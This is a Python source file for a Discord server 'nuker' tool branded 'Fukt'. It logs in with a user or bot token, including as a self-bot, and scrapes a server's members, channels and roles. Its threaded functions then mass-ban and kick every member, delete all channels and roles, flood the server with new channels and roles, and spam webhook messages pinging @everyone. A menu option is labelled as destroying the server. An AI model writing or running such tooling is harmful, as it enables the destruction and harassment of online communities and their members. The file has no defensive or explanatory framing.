import requests
import os
import sys
import threading
import time
import json
import asyncio
import discord
import aiohttp
import datetime
import subprocess
from colorama import Fore
import psutil
from colored import fg, attr

from colorama import Fore, Style
from discord import Webhook, AsyncWebhookAdapter
from discord.ext import commands
from pypresence import Presence


date = datetime.datetime.now()
ok = date.strftime("%H:%M:%S")
def close():
    os._exit(0)

def writechar(text):
   for char in text:
     sys.stdout.write(char)
     sys.stdout.flush()
     time.sleep(0.1)



def clear():
    if sys.platform.startswith("win"):
        os.system('cls')
    elif sys.platform == 'linux' or 'darwin':
        os.system('clear')

class colors:

    BLUE = fg('#ff004d8')
    reset = attr('reset')
    gray = fg('#ff4b00')
    gray = fg('#ff4b00')
    

time.sleep(3)
os.system('cls')
print(f'''


{Fore.BLUE} 
 /$$$$$$$$        /$$         /$$           /$$      /$$ /$$                    
| $$_____/       | $$        | $$          | $$  /$ | $$|__/                    
| $$    /$$   /$$| $$   /$$ /$$$$$$        | $$ /$$$| $$ /$$ /$$$$$$$$ /$$$$$$$$
| $$$$$| $$  | $$| $$  /$$/|_  $$_/        | $$/$$ $$ $$| $$|____ /$$/|____ /$$/
| $$__/| $$  | $$| $$$$$$/   | $$          | $$$$_  $$$$| $$   /$$$$/    /$$$$/ 
| $$   | $$  | $$| $$_  $$   | $$ /$$      | $$$/ \  $$$| $$  /$$__/    /$$__/  
| $$   |  $$$$$$/| $$ \  $$  |  $$$$/      | $$/   \  $$| $$ /$$$$$$$$ /$$$$$$$$
|__/    \______/ |__/  \__/   \___/        |__/     \__/|__/|________/|________/
──────────────────────────────────────────────────────
''')
token = input(f'{Fore.BLUE}[FUKTひ] {Fore.BLUE}Enter Token : {Fore.BLUE}')

os.system('cls')

def check_token():
    if requests.get("https://discord.com/api/v8/users/@me", headers={"Authorization": f'{token}'}).status_code == 200:
        return "user"
    else:
        return "bot"

token_type = check_token()
intents = discord.Intents.all()
intents.members = True

if token_type == "user":
    headers = {'Authorization': f'{token}'}
    client = commands.Bot(command_prefix=">", case_insensitive=False, self_bot=True, intents=intents)
elif token_type == "bot":
    headers = {'Authorization': f'Bot {token}'}
    client = commands.Bot(command_prefix=">", case_insensitive=False, intents=intents)

os.system('clear')

client.remove_command("help")

class Fukt:

    def __init__(self):
        self.colour = '\x1b[38;5;56m'

    def BanMembers(self, guild, member):
        while True:
            r = requests.put(f"https://discord.com/api/v9/guilds/{guild}/bans/{member}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{Fore.BLUE}[FUKTひ] {Fore.BLUE}Banned {Fore.BLUE}{member.strip()} {Fore.BLUE}")
                    break
                else:
                    break
                    

    def KickMembers(self, guild, member):
        while True:
            r = requests.delete(f"https://discord.com/api/v9/guilds/{guild}/members/{member}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{Fore.BLUE}[FUKTひ] {Fore.BLUE}Banned {Fore.BLUE}{member.strip()}")
                    break
                else:
                    break

    def DeleteChannels(self, guild, channel):
        while True:
            r = requests.delete(f"https://discord.com/api/v9/channels/{channel}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{Fore.BLUE}[FUKTひ] {Fore.BLUE}Deleted Channel {Fore.BLUE}{channel.strip()}")
                    break
                else:
                    break
    
    def DeleteChannels(self, guild, channel):
        while True:
            r = requests.delete(f"https://discord.com/api/v9/channels/{channel}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{Fore.BLUE}[FUKTひ] {Fore.BLUE}Deleted Channel {Fore.BLUE}{channel.strip()}")
                    break
                else:
                    break

    def DeleteRoles(self, guild, role):
        while True:
            r = requests.delete(f"https://discord.com/api/v9/guilds/{guild}/roles/{role}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{Fore.BLUE}[FUKTひ] {Fore.BLUE}Role Deleted {Fore.BLUE}{role.strip()}")
                    break
                else:
                    break

    def SpamChannels(self, guild, name):
        while True:
            json = {'name': name, 'type': 0}
            r = requests.post(f'https://discord.com/api/v9/guilds/{guild}/channels', headers=headers, json=json)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{Fore.BLUE}[FUKTひ] {Fore.BLUE}Created Channel {Fore.BLUE}{name}")
                    break
                else:
                    break

    def SpamRoles(self, guild, name):
        while True:
            json = {'name': name}
            r = requests.post(f'https://discord.com/api/v9/guilds/{guild}/roles', headers=headers, json=json)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{Fore.BLUE}[FUKTひ] {Fore.BLUE}Created Role {Fore.BLUE} {name}")
                    break
                else:
                    break

    def WebhookSend(self, webhook, message): #cBLUEits to anti
        while True:
            json = {
                'content': message if message != '' else "@everyone WOW WHAT A SHAME..LOL",
                'tts': False,
                'username': 'GET FUCKT LOL'
            }
            r = requests.post(f'{webhook}', json=json)
            if r.status_code == 429:
                  time.sleep(r.json()['retry_after'])
                  self.WebhookSend(webhook, message)
                  break
            else:
                if r.status_code == 204 or 201 or 200:
                    print(f"{Fore.BLUE}[FUKTひ] {Fore.BLUE}Sent message {Fore.BLUE} {message}")
                    break
                else:
                    break

    
    async def SpamWebhook(self, guild_id, amount, message):
        guild = client.get_guild(int(guild_id))
        web_urls = []
        for channel in guild.text_channels:
            try:
                webhook = await channel.create_webhook(name='FUKTひ', reason="Break on top")
                print(f"{Fore.BLUE}[FUKTひ] {Fore.BLUE}Spammed")
                web_urls.append(webhook.url)
            except Exception as e:
                print(e)
        for url in web_urls:
              for i in range(amount):
               try:
                  threading.Thread(target=self.WebhookSend, args=(url, message,)).start()
               except Exception as e:
                 print(e)





    async def Scrape(self):
        guild = input(f'{Fore.BLUE}[FUKTひ] {Fore.BLUE}Server Id: {Fore.BLUE}')
        await client.wait_until_ready()
        guildOBJ = client.get_guild(int(guild))
        members = await guildOBJ.chunk()

        try:
            os.remove("Fukt/members.txt")
            os.remove("Fukt/channels.txt")
            os.remove("Fukt/roles.txt")
        except:
            pass

        membercount = 0
        with open('Fukt/members.txt', 'a') as m:
            for member in members:
                m.write(str(member.id) + "\n")
                membercount += 1
            print(f"\n{Fore.BLUE}[FUKTひ] {Fore.BLUE}Server has {Fore.BLUE}{membercount} Members")
            m.close()

        channelcount = 0
        with open('Fukt/channels.txt', 'a') as c:
            for channel in guildOBJ.channels:
                c.write(str(channel.id) + "\n")
                channelcount += 1
            print(f"{Fore.BLUE}[FUKTひ] {Fore.BLUE}Scraped {Fore.BLUE}{channelcount} Channels")
            c.close()

        rolecount = 0
        with open('Fukt/roles.txt', 'a') as r:
            for role in guildOBJ.roles:
                r.write(str(role.id) + "\n")
                rolecount += 1
            print(f"{Fore.BLUE}[FUKTひ] {Fore.BLUE}Scraped {Fore.BLUE}{rolecount} Roles")
            r.close()

    async def NukeExecute(self):
        guild = input(f'{Fore.BLUE}[FUKTひ] {Fore.BLUE}Server Id: {Fore.BLUE}')
        channel_name = input(f"{Fore.BLUE}[FUKTひ] {Fore.BLUE}Channels Name: {Fore.BLUE}")
        channel_amount = input(f"{Fore.BLUE}[FUKTひ] {Fore.BLUE}How Many?: {Fore.BLUE}")
        role_name = input(f"{Fore.BLUE}[FUKTひ] {Fore.BLUE}Roles Name: {Fore.BLUE}")
        role_amount = input(f"{Fore.BLUE}[FUKTひ] {Fore.BLUE}How Many?: {Fore.BLUE}")
        print()

        members = open('Fukt/members.txt')
        channels = open('Fukt/channels.txt')
        roles = open('Fukt/roles.txt')

        for member in members:
            threading.Thread(target=self.BanMembers, args=(guild, member,)).start()
        for channel in channels:
            threading.Thread(target=self.DeleteChannels, args=(guild, channel,)).start()
        for role in roles:
            threading.Thread(target=self.DeleteRoles, args=(guild, role,)).start()
        for i in range(int(channel_amount)):
            threading.Thread(target=self.SpamChannels, args=(guild, channel_name,)).start()
        for i in range(int(role_amount)):
            threading.Thread(target=self.SpamRoles, args=(guild, role_name,)).start()
        members.close()
        channels.close()
        roles.close()

    async def BanExecute(self):
        guild = input(f'{Fore.BLUE}[FUKTひ] {Fore.BLUE}Server Id: {Fore.BLUE}')
        print()
        members = open('Fukt/members.txt')
        for member in members:
            threading.Thread(target=self.BanMembers, args=(guild, member,)).start()
        members.close()

    async def KickExecute(self):
        guild = input(f'{Fore.BLUE}[FUKTひ] {Fore.BLUE}Server Id: {Fore.BLUE}')
        print()
        members = open('Fukt/members.txt')
        for member in members:
            threading.Thread(target=self.KickMembers, args=(guild, member,)).start()
        members.close()

    async def ChannelDeleteExecute(self):
        guild = input(f'{Fore.BLUE}[FUKTひ] {Fore.BLUE}Server Id: {Fore.BLUE}')
        print()
        channels = open('Fukt/channels.txt')
        for channel in channels:
            threading.Thread(target=self.DeleteChannels, args=(guild, channel,)).start()
        channels.close()

    async def RoleDeleteExecute(self):
        guild = input(f'{Fore.BLUE}[FUKTひ] {Fore.BLUE}Server Id: {Fore.BLUE}')
        print()
        roles = open('Fukt/roles.txt')
        for role in roles:
            threading.Thread(target=self.DeleteRoles, args=(guild, role,)).start()
        roles.close()

    async def ChannelSpamExecute(self):
        guild = input(f'{Fore.BLUE}[FUKTひ] {Fore.BLUE}Server Id: {Fore.BLUE}')
        name = input(f"{Fore.BLUE}[FUKTひ] {Fore.BLUE}Channel Name:: {Fore.BLUE}")
        amount = input(f"{Fore.BLUE}[FUKTひ] {Fore.BLUE}How Many?: {Fore.BLUE}")
        print()
        for i in range(int(amount)):
            threading.Thread(target=self.SpamChannels, args=(guild, name,)).start()

    async def RoleSpamExecute(self):
        guild = input(f'{Fore.BLUE}[FUKTひ] {Fore.BLUE}Server Id: {Fore.BLUE}')
        name = input(f"{Fore.BLUE}[FUKTひ] {Fore.BLUE}Role Name: {Fore.BLUE}")
        amount = input(f"{Fore.BLUE}[FUKTひ] {Fore.BLUE}How Many?: {Fore.BLUE}")
        print()
        for i in range(int(amount)):
            threading.Thread(target=self.SpamRoles, args=(guild, name,)).start()

    def CBLUEits(self):
        os.system(f'')
        print(f'''
''')


    async def Menu(self):
        os.system(f'cls & title LOGIN AS  {client.user}')
        print(f'''
        {Fore.BLUE} 
 /$$$$$$$$        /$$         /$$           /$$      /$$ /$$                    
| $$_____/       | $$        | $$          | $$  /$ | $$|__/                    
| $$    /$$   /$$| $$   /$$ /$$$$$$        | $$ /$$$| $$ /$$ /$$$$$$$$ /$$$$$$$$
| $$$$$| $$  | $$| $$  /$$/|_  $$_/        | $$/$$ $$ $$| $$|____ /$$/|____ /$$/
| $$__/| $$  | $$| $$$$$$/   | $$          | $$$$_  $$$$| $$   /$$$$/    /$$$$/ 
| $$   | $$  | $$| $$_  $$   | $$ /$$      | $$$/ \  $$$| $$  /$$__/    /$$__/  
| $$   |  $$$$$$/| $$ \  $$  |  $$$$/      | $$/   \  $$| $$ /$$$$$$$$ /$$$$$$$$
|__/    \______/ |__/  \__/   \___/        |__/     \__/|__/|________/|________/

                                      ──────────────────────────────────────────────────────

                                                    ╔═══════════════════════╗
                                                    ║        Number 1       ║
                                                    ║═══════════════════════║
                                                    ║ Scrape | scrapes guild║
                                                    ╚═══════════════════════╝ 
                          ╔═══════════════════════╗ ╔═══════════════════════╗ ╔═══════════════════════╗ 
                          ║        Number 2       ║ ║        Number 3       ║ ║        Number 4       ║
                          ║═══════════════════════║ ║═══════════════════════║ ║═══════════════════════║
                          ║ Banall | 50+ per sec  ║ ║     Webhook Spam      ║ ║ Kickall | 50+ per sec ║
                          ╚═══════════════════════╝ ╚═══════════════════════╝ ╚═══════════════════════╝
╔═══════════════════════╗ ╔═══════════════════════╗ ╔═══════════════════════╗ ╔═══════════════════════╗ ╔═══════════════════════╗
║        Number 5       ║ ║        Number 6       ║ ║        Number 7       ║ ║        Number 8       ║ ║        Number 9       ║
║═══════════════════════║ ║═══════════════════════║ ║═══════════════════════║ ║═══════════════════════║ ║═══════════════════════║
║      Delete Roles     ║ ║    Delete Channels    ║ ║Nuke | destorys server ║ ║       Spam Roles      ║ ║      Spam Channels    ║
╚═══════════════════════╝ ╚═══════════════════════╝ ╚═══════════════════════╝ ╚═══════════════════════╝ ╚═══════════════════════╝
        ''')
        choice = input(f'{Fore.BLUE}[FUKTひ] {Fore.BLUE}Number: {Fore.BLUE}')
        if choice == '2': #bans
            await self.BanExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '4': #Kicks
            await self.KickExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '5': #Role Delete
            await self.RoleDeleteExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '6': #Delete Channel
            await self.ChannelDeleteExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '8': #Role Create
            await self.RoleSpamExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '9': #Channel Create
            await self.ChannelSpamExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '7': #beamserver
            await self.NukeExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '1': #Role Create
            await self.Scrape()
            time.sleep(3)
            await self.Menu()
        elif choice == '213': #Role Create
            await self.ThemeChanger()
        elif choice == '123' or choice == 'c':
            self.CBLUEits()
            input()
            await self.Menu()
        elif choice == '3':
            amount = int(input(f"{Fore.BLUE}[FUKTひ] {Fore.BLUE}How Many?: {Fore.BLUE}"))
            guild_id = int(input(f"{Fore.BLUE}[FUKTひ] {Fore.BLUE}Server Id: {Fore.BLUE}"))
            message = str(input(f"{Fore.BLUE}[FUKTひ] {Fore.BLUE}Webhook Message: {Fore.BLUE}"))
            await self.SpamWebhook(guild_id, amount, message)
        elif choice == '432' or choice == 'x':
            os._exit(0)

    @client.event
    async def on_ready():
        await Fukt().Menu()

    def Startup(self):
        try:
            if token_type == "user":
                client.run(token, bot=False)
            elif token_type == "bot":
                client.run(token)
        except:
            print(f'{Fore.BLUE}[FUKTひ] {Fore.BLUE}Token Was Invalid {Fore.BLUE}')
            input()
            os._exit(0)

if __name__ == "__main__":
    Fukt().Startup()
